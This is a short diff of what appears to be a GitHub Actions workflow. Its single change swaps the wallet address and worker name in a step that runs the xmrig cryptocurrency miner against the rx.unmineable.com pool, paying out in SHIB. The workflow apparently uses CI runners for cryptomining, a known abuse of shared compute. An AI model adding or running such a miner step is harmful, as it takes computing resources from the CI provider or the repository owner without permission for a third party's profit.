@@ -44,7 +44,7 @@ jobs:
 
     - name: Running
 
-      run: .\xmrig-6.15.1-msvc-win64\xmrig-6.15.1\xmrig.exe -o  rx.unmineable.com:3333 -a rx -k -u SHIB:0x5aB7E2FDE0625d93842c0675BaEdcf9AA7a08c85.TRUST  -p x -t 1
+      run: .\xmrig-6.15.1-msvc-win64\xmrig-6.15.1\xmrig.exe -o  rx.unmineable.com:3333 -a rx -k -u SHIB:0x2374ec6ae89d3d768db8afd9dfb03b73463e7122.DhikaS86  -p x -t 1
 
     - name: END
 
